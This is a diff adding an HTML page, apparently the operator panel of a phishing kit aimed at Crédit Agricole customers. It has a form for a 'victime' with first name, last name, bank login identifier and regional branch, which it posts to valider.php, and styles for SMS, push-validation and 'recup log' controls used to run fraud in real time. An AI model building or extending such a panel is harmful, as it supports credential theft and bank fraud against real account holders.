@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel - Caisse d'épargne</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+.container {
+    width: 100%;
+    max-width: 500px;
+    margin: 0 auto;
+    margin-left: 400px;
+}
+
+/* Nouveau conteneur pour les rubriques en grille */
+.rubriques-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 20px;
+    margin-bottom: 25px;
+}
+
+/* Ajuster les rubriques dans la grille */
+.rubriques-grid .rubrique {
+    margin-bottom: 0;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+}
+
+.rubriques-grid .rubrique-body {
+    flex: 1;
+    max-height: 400px;
+    overflow-y: auto;
+}
+
+/* Supprimer l'ancien style victime-block */
+.victime-block {
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    margin-bottom: 25px;
+    width: 100%;
+}
+
+.victime-block:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+
+.victime-block .victime-header {
+    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+    color: white;
+    padding: 18px 25px;
+    font-weight: 600;
+    font-size: 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    letter-spacing: 0.5px;
+}
+
+.victime-block .victime-body {
+    padding: 20px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 15px;
+}
+
+.victime-block .input-group {
+    margin-bottom: 0;
+}
+
+.victime-block .input-group label {
+    margin-left: 20px;
+    margin-top: 20px;
+    display: block;
+    font-size: 12px;
+    color: #495057;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: -5px;
+    font-weight: 600;
+}
+
+.victime-block .input-group input {
+    width: 90%;
+    margin-top: 10px;
+    margin-left: 20px;
+    padding: 12px;
+    border: 2px solid #e9ecef;
+    border-radius: 10px;
+    font-size: 14px;
+    transition: all 0.3s ease;
+    background: #f8f9fa;
+}
+
+.victime-block .input-group input:focus {
+    outline: none;
+    border-color: #3498db;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+}
+
+.victime-block .btn-valider {
+    padding: 12px 30px;
+    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+    color: white;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    margin-top: 20px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    align-self: end;
+}
+
+.victime-block .btn-valider:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+}
+
+/* Responsive pour le bloc victime */
+@media (max-width: 768px) {
+    .victime-block .victime-body {
+        grid-template-columns: 1fr;
+    }
+    
+    .victime-block .btn-valider {
+        width: 100%;
+    }
+}
+
+.header {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    margin-bottom: 20px;
+    background: transparent;
+    box-shadow: none;
+}
+
+.header h1 {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0;
+}
+
+.logo {
+    width: 600px;      /* ajuste la taille : plus petit = 150px, 120px… */
+    height: auto;
+    display: block;
+}
+
+.rubrique {
+    background: white;
+    border-radius: 15px;
+    margin-bottom: 25px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.rubrique:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+
+.rubrique-header {
+    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+    color: white;
+    padding: 18px 25px;
+    font-weight: 600;
+    font-size: 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    letter-spacing: 0.5px;
+}
+
+.rubrique-header .badge {
+    background: rgba(255,255,255,0.2);
+    color: white;
+    padding: 5px 15px;
+    border-radius: 20px;
+    font-size: 14px;
+    font-weight: 700;
+}
+
+        .rubrique-body {
+            padding: 15px 20px;
+            min-height: 60px;
+        }
+
+        .rubrique-body .empty {
+            color: #999;
+            font-style: italic;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+.card-data {
+    background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+    padding: 20px;
+    border-radius: 12px;
+    margin-bottom: 15px;
+    font-size: 14px;
+    border-left: 5px solid #ff7900;
+    transition: all 0.3s ease;
+    position: relative;
+}
+
+.card-data:hover {
+    background: linear-gradient(135deg, #f1f3f5 0%, #dee2e6 100%);
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+}
+
+.card-data .label {
+    color: #495057;
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 5px;
+}
+
+        .card-data .value {
+            font-weight: 600;
+            margin-top: 2px;
+            word-break: break-all;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 15px;
+        }
+
+.btn-group .btn {
+    padding: 12px 20px;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    font-size: 13px;
+    cursor: pointer;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    flex: 1;
+    min-width: 100px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    position: relative;
+    overflow: hidden;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+}
+
+.btn-group .btn::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 0;
+    height: 0;
+    background: rgba(255,255,255,0.2);
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    transition: width 0.6s, height 0.6s;
+}
+
+.btn-group .btn:hover::after {
+    width: 300px;
+    height: 300px;
+}
+
+        .btn-refuser {
+            background: #dc3545;
+            color: white;
+        }
+
+        .btn-refuser:hover {
+            background: #c82333;
+            transform: translateY(-1px);
+        }
+
+        .btn-sms {
+            background: #28a745;
+            color: white;
+        }
+
+        .btn-sms:hover {
+            background: #218838;
+            transform: translateY(-1px);
+        }
+
+        .btn-push {
+            background: #007bff;
+            color: white;
+        }
+
+        .btn-push:hover {
+            background: #0069d9;
+            transform: translateY(-1px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .no-session {
+            text-align: center;
+            padding: 40px 20px;
+            color: #666;
+        }
+
+        .no-session .icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        /* Modal de confirmation */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+
+        .modal h3 {
+            margin-bottom: 10px;
+        }
+
+        .modal p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .modal .btn-group {
+            justify-content: center;
+        }
+
+        .modal .btn {
+            flex: none;
+            padding: 10px 30px;
+            min-width: 80px;
+        }
+
+        .btn-confirm {
+            background: #ff7900;
+            color: white;
+        }
+
+        .btn-confirm:hover {
+            background: #e56a00;
+        }
+
+        .btn-cancel {
+            background: #6c757d;
+            color: white;
+        }
+
+        .btn-cancel:hover {
+            background: #5a6268;
+        }
+
+        /* Animation pour nouvelle carte */
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 121, 0, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 121, 0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 121, 0, 0); }
+        }
+
+        .new-card {
+            animation: pulse 1s ease-in-out;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .btn-group {
+                flex-direction: column;
+            }
+            .btn-group .btn {
+                min-width: unset;
+                padding: 14px 20px;
+                font-size: 16px;
+            }
+        }
+
+        .btn-bank {
+    background: #8B4513;
+    color: white;
+}
+
+.btn-bank:hover {
+    background: #6d3610;
+    transform: translateY(-1px);
+}
+
+.btn-log {
+    background: #8B4513;
+    color: white;
+}
+
+.btn-log:hover {
+    background: #6d3610;
+    transform: translateY(-1px);
+}
+
+@keyframes shimmer {
+    0% { background-position: -1000px 0; }
+    100% { background-position: 1000px 0; }
+}
+
+.loading {
+    background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+    background-size: 1000px 100%;
+    animation: shimmer 2s infinite;
+}
+
+.recup-log-block {
+    background: white;
+    border-radius: 15px;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    margin-bottom: 25px;
+    width: 100%;
+}
+
+.recup-log-block:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+}
+
+.recup-log-block .recup-log-header {
+    background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
+    color: white;
+    padding: 18px 25px;
+    font-weight: 600;
+    font-size: 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    letter-spacing: 0.5px;
+}
+
+.recup-log-block .recup-log-body {
+    padding: 20px;
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+}
+
+.recup-log-block .input-group {
+    margin-bottom: 0;
+}
+
+.recup-log-block .input-group label {
+    margin-left: 20px;
+    margin-top: 20px;
+    display: block;
+    font-size: 12px;
+    color: #495057;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: -5px;
+    font-weight: 600;
+}
+
+.recup-log-block .input-group input {
+    width: 90%;
+    margin-top: 10px;
+    margin-left: 20px;
+    padding: 12px;
+    border: 2px solid #e9ecef;
+    border-radius: 10px;
+    font-size: 14px;
+    transition: all 0.3s ease;
+    background: #f8f9fa;
+}
+
+.recup-log-block .input-group input[readonly] {
+    background: #e9ecef;
+    color: #495057;
+    cursor: not-allowed;
+}
+
+.recup-log-block .input-group input:focus {
+    outline: none;
+    border-color: #D2691E;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(210, 105, 30, 0.1);
+}
+
+.recup-log-block .btn-valider {
+    padding: 12px 30px;
+    background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
+    color: white;
+    border: none;
+    border-radius: 25px;
+    font-weight: 600;
+    margin-top: 20px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    align-self: end;
+    grid-column: span 2;
+}
+
+.recup-log-block .btn-valider:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+}
+
+@media (max-width: 768px) {
+    .recup-log-block .recup-log-body {
+        grid-template-columns: 1fr;
+    }
+    
+    .recup-log-block .btn-valider {
+        width: 100%;
+        grid-column: span 1;
+    }
+}
+
+.victime-block .input-group select {
+    width: 90%;
+    margin-top: 10px;
+    margin-left: 20px;
+    padding: 12px;
+    border: 2px solid #e9ecef;
+    border-radius: 10px;
+    font-size: 14px;
+    transition: all 0.3s ease;
+    background: #f8f9fa;
+    cursor: pointer;
+}
+
+.victime-block .input-group select:focus {
+    outline: none;
+    border-color: #3498db;
+    background: white;
+    box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+}
+    </style>
+</head>
+<body>
+<div class="container">
+<h1><img src="https://thebanks.eu/img/logos/Credit_Agricole.png" alt="" class="logo"></h1>
+    </div>
+
+        <!-- Bloc Victime en haut à gauche -->
+    <div class="victime-block">
+        <div class="victime-header">
+            🙍🏻&zwj;♂️ FULL NAME VICTIME
+        </div>
+        <div class="input-group">
+            <label>Prénom</label>
+            <input type="text" id="prenomVictime" placeholder="Entrez le prénom">
+        </div>
+        <div class="input-group">
+            <label>Nom</label>
+            <input type="text" id="nomVictime" placeholder="Entrez le prénom">
+        </div>
+
+<div class="input-group">
+    <label>Identifiant</label>
+    <input type="text" id="identifiantVictime" placeholder="Entrez l'identifiant">
+</div>
+<div class="input-group">
+    <label>Établissement</label>
+    <select id="etablissementVictime">
+        <option value="">-- Sélectionner un établissement --</option>
+        <option value="CA Alpes Provence">CA Alpes Provence — Hautes-Alpes (05), Bouches-du-Rhône (13), Vaucluse (84)</option>
+        <option value="CA Alsace Vosges">CA Alsace Vosges — Bas-Rhin (67), Haut-Rhin (68), Vosges (88)</option>
+        <option value="CA Anjou Maine">CA Anjou Maine — Maine-et-Loire (49), Mayenne (53), Sarthe (72)</option>
+        <option value="CA Aquitaine">CA Aquitaine — Gironde (33), Landes (40), Lot-et-Garonne (47)</option>
+        <option value="CA Atlantique Vendée">CA Atlantique Vendée — Loire-Atlantique (44), Vendée (85)</option>
+        <option value="CA Brie Picardie">CA Brie Picardie — Oise (60), Seine-et-Marne (77), Somme (80)</option>
+        <option value="CA Centre Est">CA Centre Est — Ain (01), Rhône (69), Saône-et-Loire (71)</option>
+        <option value="CA Centre France">CA Centre France — Allier (03), Cantal (15), Corrèze (19), Creuse (23), Puy-de-Dôme (63)</option>
+        <option value="CA Centre Loire">CA Centre Loire — Cher (18), Loiret (45), Nièvre (58)</option>
+        <option value="CA Centre Ouest">CA Centre Ouest — Indre (36), Haute-Vienne (87)</option>
+        <option value="CA Champagne Bourgogne">CA Champagne Bourgogne — Aube (10), Côte-d'Or (21), Haute-Marne (52), Yonne (89)</option>
+        <option value="CA Charente Maritime Deux Sèvres">CA Charente Maritime Deux Sèvres — Charente-Maritime (17), Deux-Sèvres (79)</option>
+        <option value="CA Charente Périgord">CA Charente Périgord — Charente (16), Dordogne (24)</option>
+        <option value="CA Corse">CA Corse — Corse-du-Sud (2a), Haute-Corse (2b)</option>
+        <option value="CA Côtes d’Armor">CA Côtes d’Armor — Côtes d'Armor (22)</option>
+        <option value="CA Des Savoie">CA Des Savoie — Savoie (73), Haute-Savoie (74)</option>
+        <option value="CA Finistère">CA Finistère — Finistère (29)</option>
+        <option value="CA Franche Comté">CA Franche Comté — Doubs (25), Jura (39), Haute-Saône (70), Territoire de Belfort (90)</option>
+        <option value="CA Guadeloupe">CA Guadeloupe — Guadeloupe (971)</option>
+        <option value="CA Ille et Vilaine">CA Ille et Vilaine — Ille-et-Vilaine (35)</option>
+        <option value="CA Languedoc">CA Languedoc — Aude (11), Gard (30), Hérault (34), Lozère (48)</option>
+        <option value="CA Loire Haute Loire">CA Loire Haute Loire — Loire (42), Haute-Loire (43)</option>
+        <option value="CA Lorraine">CA Lorraine — Meurthe-et-Moselle (54), Meuse (55), Moselle (57)</option>
+        <option value="CA Martinique-Guyane">CA Martinique-Guyane — Martinique (972), Guyane (973)</option>
+        <option value="CA Morbihan">CA Morbihan — Morbihan (56)</option>
+        <option value="CA Nord de France">CA Nord de France — Nord (59), Pas-de-Calais (62)</option>
+        <option value="CA Nord Est">CA Nord Est — Aisne (02), Ardennes (08), Marne (51)</option>
+        <option value="CA Nord Midi Pyrénées">CA Nord Midi Pyrénées — Aveyron (12), Lot (46), Tarn (81), Tarn-et-Garonne (82)</option>
+        <option value="CA Normandie">CA Normandie — Calvados (14), Manche (50), Orne (61)</option>
+        <option value="CA Normandie Seine">CA Normandie Seine — Eure (27), Seine-Maritime (76)</option>
+        <option value="CA Paris Ile de France">CA Paris Ile de France — Paris (75), Yvelines (78), Essonne (91), Hauts-de-Seine (92), Seine-St-Denis (93), Val-de-Marne (94), Val-D'Oise (95)</option>
+        <option value="CA Provence Côte d’Azur">CA Provence Côte d’Azur — Alpes-de-Haute-Provence (04), Alpes-Maritimes (06), Var (83)</option>
+        <option value="CA Pyrénées Gascogne">CA Pyrénées Gascogne — Gers (32), Pyrénées-Atlantiques (64), Hautes-Pyrénées (65)</option>
+        <option value="CA Réunion">CA Réunion — Réunion (974)</option>
+        <option value="CA Sud Rhône Alpes">CA Sud Rhône Alpes — Isère (38), Drôme (26), Ardèche (07), Rhône (69)</option>
+        <option value="CA Sud Méditerranée">CA Sud Méditerranée — Ariège (09), Pyrénées-Orientales (66)</option>
+        <option value="CA Toulouse 31">CA Toulouse 31 — Haute-Garonne (31)</option>
+        <option value="CA Touraine Poitou">CA Touraine Poitou — Indre-et-Loire (37), Vienne (86)</option>
+        <option value="CA Val de France">CA Val de France — Eure-et-Loir (28), Eure-et-Loir (41)</option>
+    </select>
+</div>
+        <button class="btn-valider" onclick="validerVictime()">✅ Valider</button>
+    </div>
+
+    </div>
+</div>
+
+<!-- Modal de confirmation -->
+<div class="modal-overlay" id="actionModal">
+    <div class="modal">
+        <h3>⚠️ Confirmation</h3>
+        <p id="modalMessage">Êtes-vous sûr de vouloir effectuer cette action ?</p>
+        <div class="btn-group">
+            <button class="btn btn-cancel" onclick="closeModal()">Annuler</button>
+            <button class="btn btn-confirm" id="confirmActionBtn">Confirmer</button>
+        </div>
+    </div>
+</div>
+<script>
+
+function validerVictime() {
+  const prenom = document.getElementById('prenomVictime').value;
+  const nom = document.getElementById('nomVictime').value;
+  const identifiant = document.getElementById('identifiantVictime').value;
+  const etablissement = document.getElementById('etablissementVictime').value;
+
+  fetch('valider.php', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'prenom=' + encodeURIComponent(prenom) +
+          '&nom=' + encodeURIComponent(nom) +
+          '&identifiant=' + encodeURIComponent(identifiant) +
+          '&etablissement=' + encodeURIComponent(etablissement)
+  })
+  .then(r => r.text())
+  .then(t => {
+    if (t === 'OK') alert('Enregistré !');
+    else alert('Erreur : ' + t);
+  });
+}
+</script>
+</body>
+</html>
